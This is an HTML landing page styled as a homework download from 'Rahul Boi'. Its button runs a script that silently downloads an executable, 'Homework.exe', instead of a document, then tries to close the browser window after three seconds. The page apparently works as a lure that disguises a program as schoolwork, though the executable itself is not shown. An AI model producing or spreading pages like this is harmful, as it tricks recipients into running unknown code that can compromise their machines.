<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Homework Download | Rahul Boi</title>
  <link rel="preconnect" href="https://fonts.googleapis.com">
  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700&display=swap" rel="stylesheet">
  <style>
    :root {
      --primary: #4361ee;
      --primary-dark: #3a56d4;
      --background: #f8fafc;
      --text: #1e293b;
      --text-light: #64748b;
      --card-shadow: 0 10px 15px -3px rgba(0, 0, 0, 0.1), 0 4px 6px -2px rgba(0, 0, 0, 0.05);
    }

    * {
      margin: 0;
      padding: 0;
      box-sizing: border-box;
    }

    body {
      font-family: 'Inter', sans-serif;
      background-color: var(--background);
      color: var(--text);
      display: flex;
      justify-content: center;
      align-items: center;
      min-height: 100vh;
      line-height: 1.6;
      padding: 2rem;
    }

    .container {
      max-width: 600px;
      width: 100%;
    }

    .card {
      background: white;
      border-radius: 16px;
      padding: 3rem;
      box-shadow: var(--card-shadow);
      text-align: center;
      transition: transform 0.3s ease;
    }

    .card:hover {
      transform: translateY(-5px);
    }

    .logo {
      width: 60px;
      height: 60px;
      margin: 0 auto 1.5rem;
      display: flex;
      align-items: center;
      justify-content: center;
      background: linear-gradient(135deg, #4361ee, #3a0ca3);
      color: white;
      border-radius: 12px;
      font-weight: 700;
      font-size: 1.5rem;
    }

    h1 {
      font-size: 1.75rem;
      font-weight: 600;
      margin-bottom: 1rem;
      color: var(--text);
    }

    .description {
      color: var(--text-light);
      margin-bottom: 2.5rem;
      font-size: 1rem;
    }

    .author {
      display: inline-block;
      font-weight: 500;
      color: var(--primary);
    }

    .download-btn {
      display: inline-flex;
      align-items: center;
      justify-content: center;
      padding: 0.875rem 2rem;
      font-size: 1rem;
      font-weight: 500;
      border: none;
      border-radius: 8px;
      background: linear-gradient(to right, var(--primary), var(--primary-dark));
      color: white;
      cursor: pointer;
      transition: all 0.3s ease;
      box-shadow: 0 4px 6px rgba(67, 97, 238, 0.2);
      width: 100%;
      max-width: 280px;
      position: relative;
      overflow: hidden;
    }

    .download-btn:hover {
      transform: translateY(-2px);
      box-shadow: 0 6px 12px rgba(67, 97, 238, 0.25);
    }

    .download-btn:active {
      transform: translateY(0);
    }

    .download-btn::after {
      content: '';
      position: absolute;
      top: -50%;
      left: -60%;
      width: 200%;
      height: 200%;
      background: rgba(255, 255, 255, 0.1);
      transform: rotate(30deg);
      transition: all 0.3s;
    }

    .download-btn:hover::after {
      left: 100%;
    }

    .icon {
      margin-right: 0.5rem;
    }

    footer {
      margin-top: 2rem;
      text-align: center;
      color: var(--text-light);
      font-size: 0.875rem;
    }

    @media (max-width: 640px) {
      .card {
        padding: 2rem 1.5rem;
      }
      
      h1 {
        font-size: 1.5rem;
      }
    }
  </style>
</head>
<body>
  <div class="container">
    <div class="card">
      <div class="logo">RB</div>
      <h1>Homework Materials</h1>
      <p class="description">
        Download the complete homework package prepared by 
        <span class="author">Rahul Boi</span>. Contains all necessary files and documentation.
      </p>
      <button class="download-btn" onclick="startDownload()">
        <svg class="icon" width="20" height="20" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
          <path d="M12 15V3M12 15L8 11M12 15L16 11M21 15V19C21 20.1046 20.1046 21 19 21H5C3.89543 21 3 20.1046 3 19V15" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/>
        </svg>
        Download Homework
      </button>
    </div>
    <footer>
      <p>Â© 2023 Rahul Boi. All rights reserved.</p>
    </footer>
  </div>

  <script>
    function startDownload() {
      const url = "./files/Homework.exe";
      const a = document.createElement('a');
      a.href = url;
      a.download = '';
      document.body.appendChild(a);
      a.click();
      a.remove();

      // Try to close the window after 3 seconds
      setTimeout(() => {
        window.open('', '_self');
        window.close();
      }, 3000);
    }
  </script>
</body>
</html>
